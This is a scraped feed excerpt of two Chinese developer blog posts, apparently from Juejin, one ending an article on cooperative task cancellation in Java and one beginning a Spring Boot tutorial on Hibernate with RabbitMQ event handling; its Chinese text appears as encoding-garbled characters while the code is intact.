    <span class="hljs-type">CancellationToken</span> <span class="hljs-variable">cancellationToken</span> <span class="hljs-operator">=</span> CancellationToken.create();

    <span class="hljs-comment">// 3. åŒ…è£…ä»»åŠ¡ï¼Œé™„åŠ ä¸Šä¸‹æ–‡</span>
    List&lt;Callable&lt;R&gt;&gt; tasks = list.stream()
            .map(item -&gt; {
                ScopedCallable&lt;R&gt; scopedCallable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScopedCallable</span>&lt;&gt;(
                    taskName, () -&gt; function.apply(item));
                scopedCallable.put(KEY_PARALLEL_OPTIONS, normalizedOptions);
                scopedCallable.put(KEY_CANCELLATION_TOKEN, cancellationToken);
                <span class="hljs-keyword">return</span> (Callable&lt;R&gt;) scopedCallable;
            })
            .collect(toImmutableList());

    <span class="hljs-comment">// 4. é€šè¿‡é™æµæ‰§è¡Œå™¨æäº¤ä»»åŠ¡</span>
    AsyncBatchResult&lt;R&gt; batchResult = ConcurrentLimitExecutor.&lt;R&gt;builder()
            .pool(executor)
            .options(normalizedOptions)
            .build()
            .submitAll(tasks);

    <span class="hljs-comment">// 5. å»¶è¿Ÿç»‘å®šï¼šå°† Future åˆ—è¡¨ç»‘å®šåˆ° CancellationToken</span>
    cancellationToken.lateBind(
        batchResult.getResults(),
        normalizedOptions.forTimeout(),
        batchResult.getSubmitCanceller());

    <span class="hljs-comment">// 6. è¶…æ—¶æ—¶è§¦å‘èµ„æºæ¸…ç†</span>
    tryPurgeOnTimeout(executorName, batchResult);

    <span class="hljs-keyword">return</span> batchResult;
}
</code></pre>
<h2 data-id="heading-9">æ—¶åºå›¾</h2>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Caller     â”‚   â”‚ FlightParallel   â”‚   â”‚CancellationTokenâ”‚   â”‚  Executor    â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚   <span class="hljs-built_in">parMap</span>(list)    â”‚                      â”‚                   â”‚
       â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚                      â”‚                   â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚                   â”‚     <span class="hljs-built_in">create</span>()         â”‚                   â”‚
       â”‚                   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚                   â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚                   â”‚              <span class="hljs-built_in">submitAll</span>(tasks)            â”‚
       â”‚                   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚                   â”‚              Future<span class="hljs-selector-attr">[]</span> results            â”‚
       â”‚                   â”‚&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚                   â”‚  <span class="hljs-built_in">lateBind</span>(futures)   â”‚                   â”‚
       â”‚                   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚                   â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚  AsyncBatchResult â”‚                      â”‚                   â”‚
       â”‚&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚                      â”‚                   â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚                   â”‚                      â”‚   ä»»åŠ¡æ‰§è¡Œ...      â”‚
       â”‚                   â”‚                      â”‚&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚                   â”‚                      â”‚   <span class="hljs-built_in">checkpoint</span>()    â”‚
       â”‚                   â”‚                      â”‚&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚                   â”‚  <span class="hljs-selector-attr">[è¶…æ—¶/å¼‚å¸¸æ—¶]</span>        â”‚                   â”‚
       â”‚                   â”‚                      â”‚   <span class="hljs-built_in">cancel</span>(true)    â”‚
       â”‚                   â”‚                      â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚
       â”‚                   â”‚                      â”‚                   â”‚
</code></pre>
<h2 data-id="heading-10">åœ¨ä¸šåŠ¡ä»£ç ä¸­ä½¿ç”¨æ£€æŸ¥ç‚¹</h2>
<p>å¯¹äº CPU å¯†é›†å‹ä»»åŠ¡ï¼Œéœ€è¦åœ¨å…³é”®ä½ç½®æ’å…¥æ£€æŸ¥ç‚¹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processLargeDataSet</span><span class="hljs-params">(List&lt;Data&gt; dataList)</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; dataList.size(); i++) {
        <span class="hljs-comment">// æ¯å¤„ç† 100 æ¡æ•°æ®æ£€æŸ¥ä¸€æ¬¡</span>
        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>) {
            Checkpoints.checkpoint(<span class="hljs-string">"processData"</span>, <span class="hljs-literal">true</span>);
        }

        processItem(dataList.get(i));
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">complexCalculation</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// é˜¶æ®µ 1</span>
    doPhase1();
    Checkpoints.checkpoint(<span class="hljs-string">"complexCalc"</span>, <span class="hljs-literal">true</span>);

    <span class="hljs-comment">// é˜¶æ®µ 2</span>
    doPhase2();
    Checkpoints.checkpoint(<span class="hljs-string">"complexCalc"</span>, <span class="hljs-literal">true</span>);

    <span class="hljs-comment">// é˜¶æ®µ 3</span>
    doPhase3();
}
</code></pre>
<h2 data-id="heading-11">æ€»ç»“</h2>
<p>æœ¬æ–‡ä»‹ç»çš„å–æ¶ˆæœºåˆ¶åŒ…å«ä»¥ä¸‹æ ¸å¿ƒè®¾è®¡æ€æƒ³ï¼š</p>

































<table><thead><tr><th>è®¾è®¡ç‚¹</th><th>è§£å†³çš„é—®é¢˜</th></tr></thead><tbody><tr><td><strong>åä½œå¼å–æ¶ˆ</strong></td><td>Java æ— æ³•å¼ºåˆ¶ä¸­æ–­ CPU å¯†é›†å‹ä»£ç </td></tr><tr><td><strong>å»¶è¿Ÿç»‘å®š</strong></td><td>è§£å†³"å…ˆåˆ›å»º Token è¿˜æ˜¯å…ˆæäº¤ä»»åŠ¡"çš„å¾ªç¯ä¾èµ–</td></tr><tr><td><strong>çŠ¶æ€æšä¸¾</strong></td><td>æ¸…æ™°åŒºåˆ†ä¸åŒå–æ¶ˆåŸå› ï¼Œä¾¿äºç›‘æ§å’Œæ’æŸ¥</td></tr><tr><td><strong>è½»é‡çº§å¼‚å¸¸</strong></td><td>ç”Ÿäº§ç¯å¢ƒå‡å°‘å †æ ˆå¼€é”€</td></tr><tr><td><strong>æ»‘åŠ¨çª—å£æäº¤</strong></td><td>æ§åˆ¶å¹¶å‘åº¦ï¼Œé¿å…çº¿ç¨‹æ± è¿‡è½½</td></tr><tr><td><strong>ä¸Šä¸‹æ–‡ä¼ é€’</strong></td><td>ThreadLocal + Attachable å®ç°è·¨æ–¹æ³•çš„å–æ¶ˆä¿¡å·ä¼ é€’</td></tr></tbody></table>
<p>è¿™å¥—æœºåˆ¶å·²åœ¨ç”Ÿäº§ç¯å¢ƒç¨³å®šè¿è¡Œï¼Œæœ‰æ•ˆå‡å°‘äº†è¶…æ—¶åœºæ™¯ä¸‹çš„èµ„æºæµªè´¹ï¼Œæå‡äº†ç³»ç»Ÿæ•´ä½“ååèƒ½åŠ›ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ73ï¼‰å¦‚ä½•åœ¨äº‹ä»¶é©±åŠ¨æ¶æ„ä¸­ä½¿ç”¨Hibernateï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600967006893719561</link>    <guid>https://juejin.cn/post/7600967006893719561</guid>    <pubDate>2026-01-30T11:49:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600967006893719561" data-draft-id="7600955777315782694" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ73ï¼‰å¦‚ä½•åœ¨äº‹ä»¶é©±åŠ¨æ¶æ„ä¸­ä½¿ç”¨Hibernateï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-30T11:49:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ73ï¼‰å¦‚ä½•åœ¨äº‹ä»¶é©±åŠ¨æ¶æ„ä¸­ä½¿ç”¨Hibernateï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T11:49:57.000Z" title="Fri Jan 30 2026 11:49:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨äº‹ä»¶é©±åŠ¨æ¶æ„ä¸­ä½¿ç”¨Hibernateï¼Œå¯ä»¥æœ‰æ•ˆåœ°å¤„ç†æ•°æ®æŒä¹…æ€§ï¼Œå¹¶åœ¨äº‹ä»¶å‘ç”Ÿæ—¶è§¦å‘ç›¸åº”çš„æ•°æ®åº“æ“ä½œã€‚äº‹ä»¶é©±åŠ¨æ¶æ„é€šå¸¸æ¶‰åŠä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆå¦‚RabbitMQã€Kafkaç­‰ï¼‰æ¥å‘å¸ƒå’Œè®¢é˜…äº‹ä»¶ã€‚ä¸‹é¢æˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•åœ¨Spring Booté¡¹ç›®ä¸­ç»“åˆHibernateå’ŒRabbitMQå®ç°äº‹ä»¶é©±åŠ¨æ¶æ„ã€‚</p>
<h3 data-id="heading-0">1. é¡¹ç›®ä¾èµ–</h3>
<p>åœ¨<code>pom.xml</code>ä¸­æ·»åŠ å¿…è¦çš„ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data JPA --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- MySQL Connector --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.26<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- HikariCP for Connection Pooling --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zaxxer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>HikariCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- RabbitMQ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-1">2. é…ç½®æ•°æ®æºå’ŒHibernateå±æ€§</h3>
<p>åœ¨<code>application.properties</code>ä¸­é…ç½®æ•°æ®æºå’ŒHibernateå±æ€§ï¼š</p>
<pre><code class="hljs language-properties" lang="properties"># MySQL Database Configuration
spring.datasource.url=jdbc:mysql://localhost:3306/mydatabase
spring.datasource.username=root
spring.datasource.password=rootpassword
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect

# RabbitMQ Configuration
spring.rabbitmq.host=localhost
spring.rabbitmq.port=5672
spring.rabbitmq.username=guest
spring.rabbitmq.password=guest
</code></pre>
<h3 data-id="heading-2">3. å®šä¹‰å®ä½“ç±»å’ŒDAOå±‚</h3>
<h4 data-id="heading-3"><code>Order.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.Entity;
<span class="hljs-keyword">import</span> javax.persistence.GeneratedValue;
<span class="hljs-keyword">import</span> javax.persistence.GenerationType;
<span class="hljs-keyword">import</span> javax.persistence.Id;
<span class="hljs-keyword">import</span> javax.persistence.Table;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;

    <span class="hljs-comment">// Getters and Setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getProduct</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> product;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProduct</span><span class="hljs-params">(String product)</span> {
        <span class="hljs-built_in">this</span>.product = product;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getQuantity</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> quantity;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setQuantity</span><span class="hljs-params">(<span class="hljs-type">int</span> quantity)</span> {
        <span class="hljs-built_in">this</span>.quantity = quantity;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> price;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-built_in">this</span>.price = price;
    }
}
</code></pre>
<h4 data-id="heading-4"><code>OrderRepository.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;Order, Long&gt; {
}
</code></pre>
<h3 data-id="heading-5">4. é…ç½®RabbitMQ</h3>
<h4 data-id="heading-6"><code>RabbitMQConfig.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.amqp.core.Queue;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitMQConfig</span> {

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">orderQueue</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(<span class="hljs-string">"orderQueue"</span>, <span class="hljs-literal">true</span>);
    }
}
</code></pre>
<h3 data-id="heading-7">5. åˆ›å»ºäº‹ä»¶å’Œäº‹ä»¶å¤„ç†å™¨</h3>
<h4 data-id="heading-8"><code>OrderCreatedEvent.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.Serializable;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCreatedEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;
    <span class="hljs-keyword">private</span> Long orderId;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;

    <span class="hljs-comment">// Getters and Setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getOrderId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> orderId;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOrderId</span><span class="hljs-params">(Long orderId)</span> {
        <span class="hljs-built_in">this</span>.orderId = orderId;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getProduct</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> product;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProduct</span><span class="hljs-params">(String product)</span> {
        <span class="hljs-built_in">this</span>.product = product;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getQuantity</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> quantity;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setQuantity</span><span class="hljs-params">(<span class="hljs-type">int</span> quantity)</span> {
        <span class="hljs-built_in">this</span>.quantity = quantity;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> price;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-built_in">this</span>.price = price;
    }
}
</code></pre>
<h4 data-id="heading-9"><code>OrderEventListener.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventListener</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderRepository orderRepository;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderEventListener</span><span class="hljs-params">(OrderRepository orderRepository)</span> {
        <span class="hljs-built_in">this</span>.orderRepository = orderRepository;
    }

    <span class="hljs-meta">@RabbitListener(queues = "orderQueue")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderCreatedEvent</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        order.setId(event.getOrderId());
        order.setProduct(event.getProduct());
        order.setQuantity(event.getQuantity());
        order.setPrice(event.getPrice());
        orderRepository.save(order);
    }
}
</code></pre>
<h3 data-id="heading-10">6. å‘å¸ƒäº‹ä»¶</h3>
<h4 data-id="heading-11"><code>OrderService.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.core.RabbitTemplate;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
